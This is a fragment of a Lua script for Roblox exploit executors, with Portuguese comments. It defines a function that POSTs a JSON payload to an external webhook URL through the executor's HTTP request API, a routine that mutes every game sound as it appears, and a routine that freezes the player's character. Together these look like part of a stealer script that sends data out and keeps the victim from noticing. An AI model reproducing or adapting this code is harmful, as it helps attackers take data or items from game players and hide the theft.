local function sendToWebhook(payload)
    local success = pcall(function()
        if syn and syn.request then
            syn.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(payload)
            })
        elseif request then
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(payload)
            })
        else
            error("Executor não suporta requisições HTTP")
        end
    end)
    return success
end

-- ====== BLOQUEAR SONS ======
local function muteAllSounds()
    local function muteDescendants(obj)
        for _, child in ipairs(obj:GetDescendants()) do
            if child:IsA("Sound") then
                child.Volume = 0
                pcall(function() child:Stop() end)
            end
        end
    end
    
    for _, obj in ipairs({workspace, game.Players, game.ReplicatedStorage, game.Lighting, game.StarterGui}) do
        muteDescendants(obj)
        obj.DescendantAdded:Connect(function(child)
            if child:IsA("Sound") then
                child.Volume = 0
                pcall(function() child:Stop() end)
            end
        end)
    end
end

local function lockPlayer()
    local char = LP.Character
    if char and char:FindFirstChild("Humanoid") then
        char.Humanoid.WalkSpeed = 0
        char.Humanoid.JumpPower = 0
    end
    
    UserInputService.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Keyboard or 
           input.UserInputType == Enum.UserInputType.MouseButton1 or
           input.UserInputType == Enum.UserInputType.MouseButton2 then
            return
        end
    end)
end

